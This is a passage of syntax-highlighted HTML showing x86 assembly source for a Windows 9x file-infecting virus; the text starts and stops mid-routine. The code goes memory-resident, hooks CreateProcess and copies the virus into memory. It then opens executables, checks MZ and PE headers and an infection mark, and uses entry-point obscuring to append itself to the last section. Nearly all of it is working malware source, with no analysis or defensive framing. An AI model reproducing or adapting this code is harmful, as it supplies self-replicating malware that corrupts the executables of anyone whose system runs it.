    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AVxdcall0A</span><span class="sc4">]</span><span class="sc0">       
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">MemoryError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">resaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">CalculateVirusVirtualAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">InterceptCP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_newapicodeaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">PageCommit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00020000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00040000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00000008h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">page_mem_size</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010001h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AVxdcall0A</span><span class="sc4">]</span><span class="sc0">       
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">MemoryError</span><span class="sc0">

    </span><span class="sc1">; IN: hookstruct:</span><span class="sc0">
    </span><span class="sc1">;   00 : offset api name</span><span class="sc0">
    </span><span class="sc1">;   04 : old apicodeaddress</span><span class="sc0">
    </span><span class="sc1">;   08 ; offset for old apicode</span><span class="sc0">
    </span><span class="sc1">;   12 ; offset for new apicode</span><span class="sc0">
    </span><span class="sc1">;   16 : new apicodeaddress</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hookstruct</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateProcess</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_oldapicodeaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_oldapicode</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_newapicode</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_newapicodeaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HOOK_API</span><span class="sc0">

    </span><span class="sc5">CopyVirusToMemory</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">resaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
 
    </span><span class="sc5">SetResidentFlag</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">

    </span><span class="sc5">ModifyPagePermissions2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20060000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0001000dh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AVxdcall0A</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">MemoryError</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'er0f'</span><span class="sc0">

    </span><span class="sc5">MemoryError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GO_RESIDENT</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">INFECT_FILE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

     </span><span class="sc5">SetFileAttributesToNormal</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_cFileName</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; esi = filename    </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFileAttributes</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    
     </span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; template handle=0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                    </span><span class="sc1">; attributes=any file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">; type= existing file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; security option = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">; shared for read</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">         </span><span class="sc1">; generic read write</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filenamebuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; offset file name</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectionError</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-------------------------------[ map file ]---------------------------------;</span><span class="sc0">

    </span><span class="sc5">CreateFileMapping</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; allocates the memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; filename handle = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; max size = memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; minumum size = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; read / write access</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; sec. attrbs= default</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFileMapping</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">                 </span><span class="sc1">; eax = new map handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">                    

    </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; memory to map</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; file offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; file offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">; file map write mode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; file map handle</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AMapViewOfFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ok map the file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseMap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; save that base</span><span class="sc0">

    </span><span class="sc5">CheckForMZMark</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">            </span><span class="sc1">; an exe file?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">   

    </span><span class="sc5">CheckInfectionMark</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ll'</span><span class="sc0">          </span><span class="sc1">; already infected?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">    

    </span><span class="sc5">NotYetInfected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">          
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">           </span><span class="sc1">; is it a PE file ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; save va PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ip_original</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; save original ip  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save imagebase</span><span class="sc0">
    
</span><span class="sc1">;------------------------------[ append section ]----------------------------;</span><span class="sc0">

    </span><span class="sc5">CheckForEPO</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_opcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">           </span><span class="sc1">; search for call opcode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CREATE_EPO</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">LocateBeginOfLastSection</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_opcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CREATE_EPO</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">LocateBeginOfLastSection</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">

    </span><span class="sc5">LocateBeginOfLastSection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; optional header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0">                    </span><span class="sc1">; file header size</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; no of sections</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; (we want the last-1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                    </span><span class="sc1">; sectionheader)</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; * header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; esi = begin of last </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; section's header</span><span class="sc0">

    </span><span class="sc5">CheckForOverLays</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; section phys size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; section phys offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">                    </span><span class="sc1">; we dont infect those</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">

